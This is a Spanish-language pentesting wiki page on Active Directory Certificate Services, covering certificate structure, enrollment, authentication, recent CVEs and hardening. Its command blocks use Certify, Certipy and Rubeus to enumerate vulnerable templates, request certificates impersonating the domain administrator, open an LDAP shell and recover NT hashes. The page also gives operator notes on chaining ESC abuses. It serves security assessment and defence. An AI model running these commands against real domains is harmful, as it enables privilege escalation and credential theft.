# Certificados AD

{{#include ../../banners/hacktricks-training.md}}

## Introducción

### Componentes de un certificado

- El **Subject** del certificado indica quién es su propietario.
- Una **Public Key** se empareja con una clave privada para vincular el certificado con su propietario legítimo.
- El **Validity Period**, definido por las fechas **NotBefore** y **NotAfter**, indica el periodo de vigencia del certificado.
- Un **Serial Number** único, proporcionado por la Certificate Authority (CA), identifica cada certificado.
- El **Issuer** se refiere a la CA que ha emitido el certificado.
- **SubjectAlternativeName** permite añadir nombres para el sujeto, lo que aumenta la flexibilidad de identificación.
- **Basic Constraints** indica si el certificado es para una CA o una entidad final, y define las restricciones de uso.
- **Extended Key Usages (EKUs)** delimitan los propósitos específicos del certificado, como la firma de código o el cifrado de correo electrónico, mediante Object Identifiers (OIDs).
- El **Signature Algorithm** especifica el método empleado para firmar el certificado.
- La **Signature**, creada con la clave privada del emisor, garantiza la autenticidad del certificado.<sup>[[4]](#references)</sup>

### Consideraciones especiales

- Los **Subject Alternative Names (SANs)** amplían la aplicabilidad de un certificado a varias identidades, algo fundamental para servidores con varios dominios. Los procesos seguros de emisión son esenciales para evitar que los atacantes suplanten identidades manipulando la especificación SAN.<sup>[[4]](#references)</sup>

### Certificate Authorities (CAs) en Active Directory (AD)

AD CS reconoce los certificados de CA en un bosque de AD mediante contenedores designados, cada uno con una función específica:<sup>[[4]](#references)</sup>

- El contenedor **Certification Authorities** almacena certificados de CA raíz de confianza.
- El contenedor **Enrolment Services** detalla las Enterprise CAs y sus plantillas de certificados.
- El objeto **NTAuthCertificates** incluye certificados de CA autorizados para la autenticación de AD.
- El contenedor **AIA (Authority Information Access)** facilita la validación de la cadena de certificados con certificados de CA intermedios y cruzados.

### Obtención de certificados: flujo de solicitud de certificado del cliente

1. El proceso de solicitud comienza cuando los clientes buscan una Enterprise CA.
2. Se crea una CSR, que contiene una clave pública y otros datos, después de generar un par de claves pública y privada.
3. La CA evalúa la CSR según las plantillas de certificados disponibles y emite el certificado en función de los permisos de la plantilla.
4. Tras aprobarla, la CA firma el certificado con su clave privada y se lo devuelve al cliente.<sup>[[4]](#references)</sup>

### Plantillas de certificados

Definidas en AD, estas plantillas especifican los ajustes y permisos para emitir certificados, incluidos los EKUs permitidos y los derechos de inscripción o modificación, fundamentales para gestionar el acceso a los servicios de certificados.<sup>[[4]](#references)</sup>

**La versión del esquema de la plantilla es importante.** Las plantillas **v1** antiguas (por ejemplo, la plantilla integrada **WebServer**) carecen de varios controles de aplicación modernos. La investigación sobre **ESC15/EKUwu** mostró que, en las plantillas **v1**, quien realiza una solicitud puede incluir **Application Policies/EKUs** en la CSR, que tienen **prioridad sobre** los EKUs configurados en la plantilla. Esto permite obtener certificados de autenticación de cliente, de agente de inscripción o de firma de código con solo derechos de inscripción. Se recomienda usar plantillas **v2/v3**, eliminar o reemplazar las plantillas v1 predeterminadas y limitar estrictamente los EKUs al propósito previsto.<sup>[[1]](#references)</sup>

## Inscripción de certificados

El proceso de inscripción de certificados lo inicia un administrador que **crea una plantilla de certificado**, que después **publica** una Enterprise Certificate Authority (CA). Así, la plantilla queda disponible para que los clientes se inscriban; para ello, se añade el nombre de la plantilla al campo `certificatetemplates` de un objeto de Active Directory.<sup>[[4]](#references)</sup>

Para que un cliente solicite un certificado, se deben conceder **derechos de inscripción**. Estos derechos se definen mediante descriptores de seguridad en la propia plantilla de certificado y en la Enterprise CA. Para que una solicitud se procese correctamente, deben concederse permisos en ambos lugares.<sup>[[4]](#references)</sup>

### Derechos de inscripción de plantillas

Estos derechos se especifican mediante Access Control Entries (ACEs), que detallan permisos como:<sup>[[4]](#references)</sup>

- Los derechos **Certificate-Enrollment** y **Certificate-AutoEnrollment**, cada uno asociado a GUID específicos.
- **ExtendedRights**, que permite todos los permisos extendidos.
- **FullControl/GenericAll**, que proporciona control total sobre la plantilla.

### Derechos de inscripción de Enterprise CA

Los derechos de la CA se describen en su descriptor de seguridad, al que se puede acceder desde la consola de administración de Certificate Authority. Algunos ajustes incluso permiten el acceso remoto a usuarios con pocos privilegios, lo que podría suponer un riesgo de seguridad.<sup>[[4]](#references)</sup>

### Controles de emisión adicionales

Pueden aplicarse ciertos controles, como:<sup>[[4]](#references)</sup>

- **Manager Approval**: deja las solicitudes pendientes hasta que las apruebe un administrador de certificados.
- **Enrolment Agents and Authorized Signatures**: especifica el número de firmas requeridas en una CSR y los OIDs de Application Policy necesarios.

### Métodos para solicitar certificados

Los certificados se pueden solicitar mediante:<sup>[[4]](#references)</sup>

1. **Windows Client Certificate Enrollment Protocol** (MS-WCCE), mediante interfaces DCOM.
2. **ICertPassage Remote Protocol** (MS-ICPR), mediante named pipes o TCP/IP.
3. La **interfaz web de inscripción de certificados**, con el rol Certificate Authority Web Enrollment instalado.
4. El **Certificate Enrollment Service** (CES), junto con el servicio Certificate Enrollment Policy (CEP).
5. El **Network Device Enrollment Service** (NDES) para dispositivos de red, mediante el Simple Certificate Enrollment Protocol (SCEP).

Los usuarios de Windows también pueden solicitar certificados mediante la GUI (`certmgr.msc` o `certlm.msc`) o herramientas de línea de comandos (`certreq.exe` o el comando `Get-Certificate` de PowerShell).

```bash
# Example of requesting a certificate using PowerShell
Get-Certificate -Template "User" -CertStoreLocation "cert:\\CurrentUser\\My"
```

## Autenticación con certificados

Active Directory (AD) admite la autenticación con certificados, principalmente mediante los protocolos **Kerberos** y **Secure Channel (Schannel)**.<sup>[[4]](#references)</sup>

### Proceso de autenticación Kerberos

En el proceso de autenticación Kerberos, la solicitud de un usuario de un Ticket Granting Ticket (TGT) se firma con la **clave privada** del certificado del usuario. Esta solicitud se somete a varias validaciones por parte del controlador de dominio, que incluyen la **vigencia**, la **ruta de certificación** y el estado de revocación del certificado. Las validaciones también incluyen comprobar que el certificado provenga de una fuente de confianza y confirmar que el emisor esté presente en el **almacén de certificados NTAUTH**. Si las validaciones se realizan correctamente, se emite un TGT. El objeto **`NTAuthCertificates`** de AD se encuentra en:

```bash
CN=NTAuthCertificates,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<com>
```

es fundamental para establecer la confianza en la autenticación mediante certificados.<sup>[[4]](#references)</sup>

Desde el despliegue de **KB5014754**, la autenticación moderna de Kerberos mediante certificados depende principalmente de la **fortaleza del mapeo**, no solo de los EKU.<sup>[[2]](#references)</sup> En los bosques reforzados:

- Puede que un certificado que solo incluya un **UPN/DNS SAN** ya no sea suficiente para iniciar sesión.
- El KDC prefiere una **vinculación fuerte**, normalmente la **extensión de seguridad SID** (`1.3.6.1.4.1.311.25.2`) o un mapeo explícito fuerte en `altSecurityIdentities`.
- Si el certificado carece de un mapeo fuerte, los DC registran **Kdcsvc Event ID 39/41** en modo de compatibilidad y deniegan la autenticación en modo de aplicación.
- En rutas de ataque mixtas, **ESC9/ESC16** son relevantes porque eliminan la extensión SID de los certificados emitidos; después, los operadores recurren a mapeos explícitos o a formatos de SID en URL del SAN, cuando la ruta de ataque lo permite.

### Autenticación de Secure Channel (Schannel)

Schannel facilita conexiones TLS/SSL seguras. Durante el protocolo de enlace, el cliente presenta un certificado que, si se valida correctamente, autoriza el acceso.<sup>[[5]](#references)</sup> El mapeo de un certificado a una cuenta de AD puede implicar la función **S4U2Self** de Kerberos o el **Subject Alternative Name (SAN)** del certificado, entre otros métodos.<sup>[[4]](#references)</sup>

Schannel también es la alternativa práctica cuando **PKINIT** no está disponible. Por ejemplo, si un controlador de dominio no tiene un certificado adecuado de **Smart Card Logon**, `certipy auth`/las herramientas de PKINIT pueden no obtener un TGT, pero el mismo certificado aún puede utilizarse contra **LDAPS** o **LDAP StartTLS** para la autenticación y las operaciones LDAP.

### Enumeración de AD Certificate Services

Los servicios de certificados de AD se pueden enumerar mediante consultas LDAP, que revelan información sobre las **Enterprise Certificate Authorities (CA)** y sus configuraciones. Cualquier usuario autenticado en el dominio puede acceder a esta información sin privilegios especiales.<sup>[[4]](#references)</sup> Herramientas como **[Certify](https://github.com/GhostPack/Certify)** y **[Certipy](https://github.com/ly4k/Certipy)** se utilizan para la enumeración y la evaluación de vulnerabilidades en entornos de AD CS.<sup>[[6]](#references)</sup>

Entre los comandos para usar estas herramientas se incluyen:

```bash
# Enumerate trusted root CA certificates, Enterprise CAs, and web endpoints
Certify.exe cas

# Identify vulnerable templates and dump relevant permissions
Certify.exe find /vulnerable
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /showAdmins

# Certipy 5.x enumeration focused on enabled/vulnerable templates
certipy find -enabled -vulnerable -hide-admins -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Save JSON/CSV output for offline review or BloodHound correlation
certipy find -json -output corp_adcs -u john@corp.local -p Passw0rd -dc-ip 10.10.10.10

# Request a certificate over the Web Enrollment endpoint or DCOM/RPC
certipy req -web -ca corp-CA -target ca.corp.local -template WebServer -upn john@corp.local -dns www.corp.local
certipy req -ca corp-CA -target ca.corp.local -template User -upn administrator@corp.local -sid S-1-5-21-...-500

# Use the issued certificate either for PKINIT or directly for LDAP Schannel auth
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10 -ldap-shell

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

### Flags de enumeración de Certify y PKINIT con Rubeus

Las siguientes variantes de comandos de Certify conservan sus filtros y opciones de salida específicos.<sup>[[6]](#references)</sup>

```bash
# Enumerate trusted root CA certificates, Enterprise CAs and HTTP enrollment endpoints
# Useful flags: /domain, /path, /hideAdmins, /showAllPermissions, /skipWebServiceChecks
Certify.exe cas [/ca:SERVER\ca-name | /domain:domain.local | /path:CN=Configuration,DC=domain,DC=local] [/hideAdmins] [/showAllPermissions] [/skipWebServiceChecks]

# Identify vulnerable certificate templates and filter for common abuse cases
Certify.exe find
Certify.exe find /vulnerable [/currentuser]
Certify.exe find /enrolleeSuppliesSubject   # ESC1 candidates (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
Certify.exe find /clientauth                # templates with client-auth EKU
Certify.exe find /showAllPermissions        # include template ACLs in output
Certify.exe find /json /outfile:C:\Temp\adcs.json

# Enumerate PKI object ACLs (Enterprise PKI container, templates, OIDs) – useful for ESC4/ESC7 discovery
Certify.exe pkiobjects [/domain:domain.local] [/showAdmins]

# Use Certipy for enumeration and identifying vulnerable templates
certipy find -vulnerable -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128

# Enumerate Enterprise CAs and certificate templates with certutil
certutil.exe -TCAInfo
certutil -v -dstemplate
```

Rubeus también puede usar un certificado PFX protegido con contraseña para la autenticación PKINIT y solicitar un TGT. El switch opcional `/getcredentials` solicita un ticket de servicio U2U e intenta recuperar el hash NT de la cuenta:<sup>[[7]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:<USER> /certificate:C:\temp\leaked.pfx /password:<PFX_PASSWORD> /getcredentials /ptt
```

Para el abuso de templates y CA específico de ESC, consulta [AD CS Domain Escalation](ad-certificates/domain-escalation.md).

---

## Vulnerabilidades recientes y actualizaciones de seguridad (2022-2025)

| Año | ID / Nombre | Impacto | Conclusiones clave |
|------|-----------|--------|----------------|
| 2022 | **CVE-2022-26923** – “Certifried” / ESC6 | *Escalada de privilegios* mediante la suplantación de certificados de cuentas de máquina durante PKINIT. | El parche se incluye en las actualizaciones de seguridad del **10 de mayo de 2022**. Los controles de auditoría y de mapeo seguro se introdujeron mediante **KB5014754**; los entornos ahora deberían estar en modo *Full Enforcement*.  |
| 2023 | **CVE-2023-35350 / 35351** | *Ejecución remota de código* en los roles AD CS Web Enrollment (certsrv) y CES. | Los PoC públicos son limitados, pero los componentes IIS vulnerables suelen estar expuestos internamente. Aplicar el parche publicado en el Patch Tuesday de **julio de 2023**.  |
| 2024 | **CVE-2024-49019** – “EKUwu” / ESC15 | En los **templates v1**, un solicitante con derechos de inscripción puede incluir **Application Policies/EKUs** en la CSR, que tienen prioridad sobre los EKUs del template, y generar certificados de autenticación de cliente, agente de inscripción o firma de código. | Corregido desde el **12 de noviembre de 2024**. Reemplazar o sustituir templates v1 (p. ej., WebServer predeterminado), restringir los EKUs según su propósito y limitar los derechos de inscripción. |

### Cronología de hardening de Microsoft (KB5014754)

Microsoft introdujo un despliegue en tres fases (Compatibility → Audit → Enforcement) para alejar la autenticación Kerberos con certificados de los mapeos implícitos débiles. Desde el **11 de febrero de 2025**, los controladores de dominio cambian automáticamente a **Full Enforcement** si no se establece el valor del registro `StrongCertificateBindingEnforcement`. Más adelante, Microsoft actualizó la cronología para que la vuelta al modo de compatibilidad siga siendo posible hasta la actualización de seguridad del **9 de septiembre de 2025**.<sup>[[2]](#references)</sup> Los administradores deberían:

1. Aplicar parches a todos los DC y servidores AD CS (de mayo de 2022 o posteriores).
2. Supervisar los eventos con ID 39/41 para detectar mapeos débiles durante la fase *Audit*.
3. Volver a emitir certificados de autenticación de cliente con la nueva extensión **SID** o configurar mapeos manuales seguros antes de que Enforcement bloquee los mapeos débiles.

### Notas para operadores de bosques con hardening

- **ESC1/ESC6 por sí solos ya no cuentan toda la historia** en entornos de 2025 o posteriores. Si solicitas un certificado para otra entidad, normalmente también necesitas un artefacto de mapeo seguro, como la extensión SID o un mapeo explícito.
- **ESC15 (EKUwu)** es útil sobre todo en entornos sin parches, porque convierte templates **v1** aparentemente inocuos, como **WebServer**, en certificados capaces de autenticarse o actuar como agente de inscripción al inyectar **Application Policies**. Kerberos PKINIT sigue evaluando los EKUs, pero **LDAP Schannel** también respeta Application Policies, por lo que el abuso basado en LDAP sigue siendo relevante.<sup>[[1]](#references)</sup>
- **ESC16** es una opción que afecta a toda la CA: si la CA deshabilita globalmente la extensión de seguridad SID, todos los certificados emitidos recurren a un comportamiento de mapeo más débil, salvo que la cadena de ataque inyecte un SID en otro formato compatible.
- **Los derechos de ESC7 son distintos:** un permiso `ManageCA` en una CA puede permitir cambios en ajustes como `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6), mientras que `ManageCertificates` controla la aprobación de solicitudes. Un Deny explícito sobre los derechos de administrador de certificados puede bloquear esa vía de aprobación incluso si también existe un Allow; evalúa la ACL efectiva de la CA antes de encadenar ajustes y templates. Consulta [la evaluación de ACL de CA de Microsoft](https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-vulnerable-ca-setting).

---

## Mejoras de detección y hardening

* **El sensor AD CS de Defender for Identity (2023-2024)** ahora muestra evaluaciones de postura para ESC1-ESC8/ESC11 y genera alertas en tiempo real, como *“Emisión de certificados de controlador de dominio para una entidad que no es un DC”* (ESC8) y *“Impedir la inscripción de certificados con Application Policies arbitrarias”* (ESC15). Asegúrate de que los sensores estén implementados en todos los servidores AD CS para aprovechar estas detecciones.<sup>[[3]](#references)</sup>
* Deshabilita o limita estrictamente la opción **“Supply in the request”** en todos los templates; prefiere valores SAN/EKU definidos explícitamente.
* Elimina **Any Purpose** o **No EKU** de los templates, salvo que sean absolutamente necesarios (aborda escenarios ESC2).
* Exige **aprobación del administrador** o flujos de trabajo dedicados de Enrollment Agent para templates sensibles (p. ej., WebServer / CodeSigning).
* Restringe la inscripción web (`certsrv`) y los endpoints CES/NDES a redes de confianza o protégelos con autenticación mediante certificado de cliente.
* Exige cifrado para la inscripción RPC (`certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST`) para mitigar ESC11 (relay RPC). Esta opción está **activada de forma predeterminada**, pero suele deshabilitarse para clientes antiguos, lo que vuelve a abrir el riesgo de relay.
* Protege los **endpoints de inscripción basados en IIS** (CES/Certsrv): deshabilita NTLM cuando sea posible o exige HTTPS + Extended Protection para bloquear los relays ESC8.

Evalúa ESC11 en el host que ejecuta la CA, que puede ser un servidor miembro del dominio y no un controlador de dominio. Lee el valor activo `InterfaceFlags` de la CA en `HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration`; si el valor no se puede leer o no existe, el resultado es desconocido, no una prueba de que el cifrado RPC esté deshabilitado. Un bit `IF_ENFORCEENCRYPTICERTREQUEST` desactivado es una pista de configuración que aún requiere un endpoint RPC de inscripción accesible, credenciales que se puedan coaccionar y un template de certificado utilizable. Para ESC8, un desafío HTTP NTLM por sí solo no basta: confirma que exista un endpoint de inscripción funcional.

---

## References

- [1] [EKUwu: No es solo otro ESC de AD CS](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [2] [KB5014754: Cambios en la autenticación basada en certificados en los controladores de dominio de Windows](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [3] [Evaluaciones de la postura de seguridad de certificados - Microsoft Defender for Identity](https://learn.microsoft.com/en-us/defender-for-identity/security-posture-assessments/certificates)
- [4] [Certified Pre-Owned: Abuso de Active Directory Certificate Services](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
- [5] [¿Qué es la autenticación de cliente SSL/TLS y cómo funciona?](https://comodosslstore.com/blog/what-is-ssl-tls-client-authentication-how-does-it-work.html)
- [6] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [7] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
{{#include ../../banners/hacktricks-training.md}}
